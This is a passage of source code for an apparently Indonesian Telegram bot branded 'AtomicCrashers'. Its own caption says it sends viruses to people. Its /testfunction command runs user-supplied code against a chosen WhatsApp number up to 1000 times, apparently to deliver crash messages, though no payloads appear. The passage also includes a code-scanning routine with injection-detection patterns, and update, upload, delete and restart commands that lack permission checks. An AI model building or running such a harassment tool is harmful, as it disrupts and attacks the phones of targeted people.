    if (trimmedLine.includes("child_process") && (trimmedLine.includes("exec") || trimmedLine.includes("spawn"))) {
      if (!trimmedLine.includes("sanitize") && !trimmedLine.includes("escape")) {
        warnings.push(`Line ${lineNum}: Unsanitized command execution may be vulnerable`);
        vulnerabilities.push(`Line ${lineNum}: Command injection risk detected`);
      }
    }
    
    if (trimmedLine.includes("fs.") && (trimmedLine.includes("write") || trimmedLine.includes("unlink"))) {
      if (!trimmedLine.includes("path.resolve") && !trimmedLine.includes("path.join")) {
        warnings.push(`Line ${lineNum}: File operation without path sanitization`);
      }
    }
    
    if (trimmedLine.includes("require(") && trimmedLine.includes("vm") && trimmedLine.includes("run")) {
      errors.push(`Line ${lineNum}: VM module execution detected`);
      vulnerabilities.push(`Line ${lineNum}: vm.run can escape sandbox`);
    }
    
    if (trimmedLine.includes("Function(") && trimmedLine.includes("return")) {
      errors.push(`Line ${lineNum}: Dynamic Function constructor usage`);
      vulnerabilities.push(`Line ${lineNum}: Function constructor similar to eval()`);
    }
    
    if (trimmedLine.includes("setTimeout") && trimmedLine.includes("string")) {
      warnings.push(`Line ${lineNum}: setTimeout with string parameter like eval`);
    }
    
    if (trimmedLine.includes("setInterval") && trimmedLine.includes("string")) {
      warnings.push(`Line ${lineNum}: setInterval with string parameter like eval`);
    }
    
    if ((trimmedLine.includes("JSON.parse") || trimmedLine.includes("JSON.stringify")) && !trimmedLine.includes("try")) {
      suggestions.push(`Line ${lineNum}: Wrap JSON operations in try-catch`);
    }
    
    if (trimmedLine.includes("await ") && !trimmedLine.includes("try") && !line.includes("async")) {
      errors.push(`Line ${lineNum}: await used outside async function`);
    }
    
    if (trimmedLine.includes("console.log") && trimmedLine.includes("token")) {
      warnings.push(`Line ${lineNum}: Potential token exposure in console.log`);
    }
    
    if (trimmedLine.includes("password") && trimmedLine.includes("=") && !trimmedLine.includes("process.env")) {
      warnings.push(`Line ${lineNum}: Hardcoded password detected`);
      vulnerabilities.push(`Line ${lineNum}: Credentials in source code`);
    }
    
    if (trimmedLine.includes("while(true)") || trimmedLine.includes("while (true)")) {
      warnings.push(`Line ${lineNum}: Infinite loop detected`);
    }
    
    if ((trimmedLine.match(/\(/g) || []).length !== (trimmedLine.match(/\)/g) || []).length) {
      errors.push(`Line ${lineNum}: Unmatched parentheses`);
    }
    
    if ((trimmedLine.match(/\{/g) || []).length !== (trimmedLine.match(/\}/g) || []).length) {
      errors.push(`Line ${lineNum}: Unmatched braces`);
    }
    
    if ((trimmedLine.match(/\[/g) || []).length !== (trimmedLine.match(/\]/g) || []).length) {
      errors.push(`Line ${lineNum}: Unmatched brackets`);
    }
    
    if (trimmedLine.includes("catch") && !trimmedLine.includes("(e)") && !trimmedLine.includes("(err)") && !trimmedLine.includes("(error)")) {
      warnings.push(`Line ${lineNum}: Empty catch block may hide errors`);
    }
    
    if (trimmedLine.includes("delete ") && trimmedLine.includes("Array")) {
      suggestions.push(`Line ${lineNum}: delete on array leaves holes, use splice instead`);
    }
    
    if (trimmedLine.includes("typeof ") && trimmedLine.includes("=== 'object'") && !trimmedLine.includes("null")) {
      suggestions.push(`Line ${lineNum}: typeof null returns 'object', check for null first`);
    }
    
    if (trimmedLine.includes("== ") && !trimmedLine.includes("=== ")) {
      suggestions.push(`Line ${lineNum}: Use === instead of == for strict comparison`);
    }
    
    if (trimmedLine.includes("new Buffer(")) {
      warnings.push(`Line ${lineNum}: new Buffer() is deprecated, use Buffer.from() or Buffer.alloc()`);
    }
    
    if (trimmedLine.includes("__proto__")) {
      warnings.push(`Line ${lineNum}: __proto__ usage may cause prototype pollution`);
    }
    
    if (trimmedLine.includes("constructor") && trimmedLine.includes("prototype")) {
      warnings.push(`Line ${lineNum}: Prototype manipulation detected`);
    }
  });

  try {
    new Function(funcCode);
  } catch (syntaxErr) {
    errors.push(`Syntax Error: ${syntaxErr.message}`);
  }

  const sandbox = {
    console: {
      log: () => {},
      error: () => {},
      warn: () => {}
    },
    require: (moduleName) => {
      const allowedModules = ["crypto", "buffer", "util", "events", "stream", "path"];
      if (allowedModules.includes(moduleName)) {
        return require(moduleName);
      }
      throw new Error(`Module ${moduleName} not allowed in analysis`);
    },
    process: { env: {}, exit: () => {} },
    setTimeout: () => {},
    setInterval: () => {},
    Buffer,
    global: {}
  };

  try {
    const context = vm.createContext(sandbox);
    vm.runInContext(funcCode, context, { timeout: 5000 });
  } catch (runtimeErr) {
    errors.push(`Runtime Error: ${runtimeErr.message}`);
  }

  let resultCaption = `
<pre>⌬ 𝚉 𝙰 𝙻 𝙸 𝙽 𝙳 𝚁 𝙰  𝙸 𝙽 𝚅 𝙻 𝙰 𝚂° </pre>
🥀 - Telegram || 私は誰かにウイルスを送信できるボットです。私を最大限に活用し、無実の人々に危害を加えないでください。
━━━━━━━━━━━━━━━

🦋 - 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏
 ◉ Author: @seanoffc
 ◉ Version: 16.0.0 Pro
 ◉ Language: JavaScript
 ◉ Prefix: /

📊 - 𝑪𝒐𝒅𝒆 𝑺𝒕𝒂𝒕𝒊𝒔𝒕𝒊𝒄𝒔
 ◉ Functions: ${functionCount}
 ◉ Variables: ${variableCount}
 ◉ Async: ${asyncCount}
 ◉ Promises: ${promiseCount}
 ◉ Callbacks: ${callbackCount}
 ◉ Loops: ${loopCount}
 ◉ Conditions: ${conditionCount}
`;

  if (errors.length > 0) {
    resultCaption += `
❌ - 𝑬𝒓𝒓𝒐𝒓𝒔 (${errors.length})
${errors.slice(0, 5).map(e => ` ◉ ${escapeHtml(e)}`).join("\n")}
${errors.length > 5 ? ` ◉ ... and ${errors.length - 5} more` : ""}
`;
  } else {
    resultCaption += `
✅ - 𝑬𝒓𝒓𝒐𝒓𝒔 (0)
 ◉ No syntax errors detected
`;
  }

  if (warnings.length > 0) {
    resultCaption += `
⚠️ - 𝑾𝒂𝒓𝒏𝒊𝒏𝒈𝒔 (${warnings.length})
${warnings.slice(0, 5).map(w => ` ◉ ${escapeHtml(w)}`).join("\n")}
${warnings.length > 5 ? ` ◉ ... and ${warnings.length - 5} more` : ""}
`;
  }

  if (vulnerabilities.length > 0) {
    resultCaption += `
🚨 - 𝑽𝒖𝒍𝒏𝒆𝒓𝒂𝒃𝒊𝒍𝒊𝒕𝒊𝒆𝒔 (${vulnerabilities.length})
${vulnerabilities.slice(0, 3).map(v => ` ◉ ${escapeHtml(v)}`).join("\n")}
${vulnerabilities.length > 3 ? ` ◉ ... and ${vulnerabilities.length - 3} more` : ""}
`;
  }

  if (suggestions.length > 0) {
    resultCaption += `
💡 - 𝑺𝒖𝒈𝒈𝒆𝒔𝒕𝒊𝒐𝒏𝒔
${suggestions.slice(0, 3).map(s => ` ◉ ${escapeHtml(s)}`).join("\n")}
${suggestions.length > 3 ? ` ◉ ... and ${suggestions.length - 3} more` : ""}
`;
  }

  const riskLevel = vulnerabilities.length > 3 ? "HIGH" : vulnerabilities.length > 0 ? "MEDIUM" : "LOW";
  const riskEmoji = riskLevel === "HIGH" ? "🔴" : riskLevel === "MEDIUM" ? "🟡" : "🟢";
  
  resultCaption += `
━━━━━━━━━━━━━━━
📋 - 𝑨𝒔𝒔𝒆𝒔𝒔𝒎𝒆𝒏𝒕
 ◉ Risk Level: ${riskEmoji} ${riskLevel}
 ◉ Code Quality: ${errors.length === 0 && warnings.length < 3 ? "Good" : "Needs Improvement"}
 ◉ Ready to Use: ${errors.length === 0 && vulnerabilities.length === 0 ? "Yes" : "No"}

© seannnz
`;

  const keyboard = [];
  
  if (funcCode.length > 5000) {
    keyboard.push([{ text: "📄⃟༑⌁⃰𝐕𝐈𝐄𝐖 𝐅𝐔𝐋𝐋 𝐂𝐎𝐃𝐄ཀ͜͡", callback_data: `viewcode_${Date.now()}` }]);
  }
  
  keyboard.push([{ text: "🔙⃟༑⌁⃰𝐁𝐀𝐂𝐊 𝐓𝐎 𝐌𝐄𝐍𝐔ཀ͜͡", callback_data: "/start" }]);

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMsg.message_id, undefined, resultCaption, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: keyboard
    }
  });

  if (funcCode.length > 5000) {
    bot.action(`viewcode_${Date.now()}`, async (actionCtx) => {
      const chunks = funcCode.match(/.{1,4000}/gs) || [funcCode];
      for (let i = 0; i < chunks.length; i++) {
        await actionCtx.reply(`<pre>${escapeHtml(chunks[i])}</pre>`, { parse_mode: "HTML" });
        if (i < chunks.length - 1) await sleep(500);
      }
      await actionCtx.answerCbQuery("✅ Code displayed");
    });
  }
});

bot.command("iphoneqc", checkPremium, checkCooldown, async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!text) {
    return ctx.reply("🪧 ☇ Format: /iphoneqc apophis nih dek", { parse_mode: "HTML" });
  }

  const moment = require("moment-timezone");
  const time = moment().tz("Asia/Jakarta").format("HH:mm");
  const battery = Math.floor(Math.random() * 44) + 55;

  let carrier;
  switch (true) {
    case text.toLowerCase().includes("love"):
      carrier = "Telkomsel";
      break;
    case text.toLowerCase().includes("game"):
      carrier = "Tri";
      break;
    case text.toLowerCase().includes("net"):
      carrier = "XL Axiata";
      break;
    default:
      const randomList = ["Indosat", "Telkomsel", "XL", "Tri", "Smartfren"];
      carrier = randomList[Math.floor(Math.random() * randomList.length)];
  }

  const messageText = encodeURIComponent(text);
  const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  await ctx.reply("⏳ ☇ Sedang membuat gambar");

  try {
    const axios = require("axios");
    const res = await axios.get(url, { responseType: "arraybuffer", timeout: 15000 });
    const buffer = Buffer.from(res.data);
    await ctx.replyWithPhoto({ source: buffer }, {
      parse_mode: "HTML",
    });
  } catch (e) {
    console.error(e);
    await ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

/// END 

bot.command("testfunction", checkWhatsAppConnection, checkAdmin, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ")
    if (args.length < 3)
      return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 ( reply function )")

    const q = args[1]
    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
    if (isNaN(jumlah) || jumlah <= 0)
      return ctx.reply("❌ ☇ Jumlah harus angka")

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
      return ctx.reply("❌ ☇ Reply dengan function")

    const processMsg = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: `
<blockquote><pre>📋 𝐙𝐀𝐋𝐈𝐍𝐃𝐑𝐀 ─────═⬡
👉  Target: ${q}
👉  Type: Unknown Function
👉  Status: Proses
</pre></blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ CEK TARGET", url: `https://wa.me/${q}` }]
          ]
        }
      }
    )
    const processMessageId = processMsg.message_id

    const safeSock = createSafeSock(sock)
    const funcCode = ctx.message.reply_to_message.text
    const match = funcCode.match(/async function\s+(\w+)/)
    if (!match) return ctx.reply("❌ ☇ Function tidak valid")
    const funcName = match[1]

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser
    }
    const context = vm.createContext(sandbox)

    const wrapper = `${funcCode}\n${funcName}`
    const fn = vm.runInContext(wrapper, context)
    console.log("start")
    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length
        if (arity === 1) {
          await fn(target)
        } else if (arity === 2) {
          await fn(safeSock, target)
        } else {
          await fn(safeSock, target, true)
        }
      } catch (err) {}
      await sleep(200)
    }
    console.log("done testfunction")
    const finalText = `
<blockquote><pre>📋 ZALINDRA ─────═⬡
👉  Target: ${q}
👉  Type: Unknown Function
👉  Status: Success
</pre></blockquote>
`
    try {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        processMessageId,
        undefined,
        finalText,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ CEK TARGET", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
    } catch (e) {
      await ctx.replyWithPhoto(
        { url: thumbnailUrl },
        {
          caption: finalText,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ CEK TARGET", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
    }
  } catch (err) {}
});


/// CASE BUAT OWNER MENU ///
bot.command("cekprem", async (ctx) => {
  try {
    let target = ctx.from;

  
    if (ctx.message.reply_to_message) {
      target = ctx.message.reply_to_message.from;
    }

    const userId = target.id.toString();
    const firstName = target.first_name || "-";
    const lastName = target.last_name || "";
    const fullName = `${firstName} ${lastName}`.trim();
    const username = target.username ? `@${target.username}` : "Tidak ada username";

   
    const isUserPremium = premiumUsers.includes(userId);
    const isUserAdmin = adminList.includes(userId);
    const isUserOwner = ownerUsers.includes(userId);

    let status = "Non Premium ❌";

    if (isUserOwner) {
      status = "Owner 👑";
    } else if (isUserAdmin) {
      status = "Admin ⚡";
    } else if (isUserPremium) {
      status = "Premium 💎";
    }

  
    let groupStatus = "Private Chat";
    if (ctx.chat.type !== "private") {
      groupStatus = isGroupPremium(ctx.chat.id)
        ? "Group Premium ✅"
        : "Group Non Premium ❌";
    }

    const teks = `
<blockquote><strong>「 CEK STATUS USER 」</strong></blockquote>
👤 Nama: ${fullName}
🆔 ID: <code>${userId}</code>
🔗 Username: ${username}
💎 Status: ${status}
🏷️ Group: ${groupStatus}
💬 Chat ID: <code>${ctx.chat.id}</code>
`;

    await ctx.reply(teks, {
      parse_mode: "HTML"
    });

  } catch (e) {
    console.error("CEKPREM ERROR:", e);

    await ctx.reply(
      `❌ Error saat cek premium\n${e.message}`
    );
  }
});

bot.command("listcmd", checkAdmin, async (ctx) => {
  const data = loadCmdMode();
  const disabled = Array.isArray(data?.disabled) ? data.disabled : [];

  const allCommands = [...commandList];

  const active = allCommands.filter(c => !disabled.includes(c));

  const activeList = active.length
    ? active.map(c => `➤ /${c}`).join("\n")
    : "Tidak ada";

  const disabledList = disabled.length
    ? disabled.map(c => `➤ /${c}`).join("\n")
    : "Tidak ada";

  return ctx.replyWithPhoto(
    { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
    {
      caption:
`<pre>📊 SYSTEM COMMAND

┌─ ✅ CMD AKTIF
${activeList}

└─ ⛔ CMD NONAKTIF
${disabledList}</pre>`,
      parse_mode: "HTML"
    }
  );
});

bot.command("addgroupremium", checkOwner, async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini sudah PREMIUM");
    }

  
    premiumGroups.push(groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dijadikan PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

const fsp = fs.promises;
// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "name gh";
const DEFAULT_REPO = UPD.github_repo_default || "name repo";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "telegraf-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== COMMANDS ==================

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.command("update", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await ctx.reply(`⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`, { parse_mode: "Markdown" });

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.reply("✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfiles <repo> (reply file .js)
bot.command("addfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");

    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// /delfiles <repo> <path/file.js>
bot.command("dellfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;
    const file = parts[2];

    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
    }

    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});
  
// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});



bot.command("delgrouppremium", checkOwner, async (ctx) => {
  try {
    
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini bukan premium");
    }

    
    premiumGroups = premiumGroups.filter(id => id !== groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dihapus dari PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});


bot.command("addadmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addadmin 123");

  if (adminList.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah admin.`);
  }

  addAdmin(userId);
  ctx.reply(`✅ Berhasil tambah ${userId} jadi admin`);
});


bot.command("addprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addprem 123");

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`✅ Berhasil tambah ${userId} jadi premium`);
});


bot.command("deladmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /deladmin 123");

  if (!adminList.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di admin.`);
  }

  removeAdmin(userId);
  ctx.reply(`🚫 Berhasil hapus ${userId} dari admin`);
});


bot.command("delprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /delprem 123");

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di premium.`);
  }

  premiumUsers = premiumUsers.filter(id => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`🚫 Berhasil hapus ${userId} dari premium`);
});

bot.command("antivideo", async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Hanya bisa di group");
    }

    const chatId = ctx.chat.id.toString();

    
    const member = await ctx.getChatMember(ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) {
      return ctx.reply("📌 Format: /antivideo on /off");
    }

  
    if (args === "on") {
      if (!antiVideoGroups.includes(chatId)) {
        antiVideoGroups.push(chatId);
        saveAntiVideo(antiVideoGroups);
      }
      return ctx.reply("✅ Anti video aktif di grup ini");
    }

   
    if (args === "off") {
      antiVideoGroups = antiVideoGroups.filter(id => id !== chatId);
      saveAntiVideo(antiVideoGroups);
      return ctx.reply("❌ Anti video dimatikan");
    }

    return ctx.reply("📌 Gunakan: /antivideo on /off");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})


bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("on");
  ctx.reply("👥 Group Only berhasil diaktifkan.");
});

bot.command("groupoff", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("off");
  ctx.reply("🌍 Group Only dimatikan.");
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});


bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");

  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("Gunakan:\n/anticulik on\n/anticulik off\n/anticulik autoreject");
  }

  if (args === "on") {
    antiCulik = true;
    autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
